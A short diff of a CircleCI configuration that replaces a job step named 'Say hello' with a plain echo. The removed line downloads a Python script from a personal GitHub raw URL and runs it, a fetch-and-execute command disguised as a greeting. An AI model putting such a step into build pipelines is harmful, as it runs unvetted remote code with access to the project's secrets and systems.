@@ -20,7 +20,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "wget https://raw.githubusercontent.com/Pkoka99/poka1/refs/heads/main/t.py\n python t.py"
+          command: "echo hello world"
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/workflows/ & https://circleci.com/docs/configuration-reference/#workflows
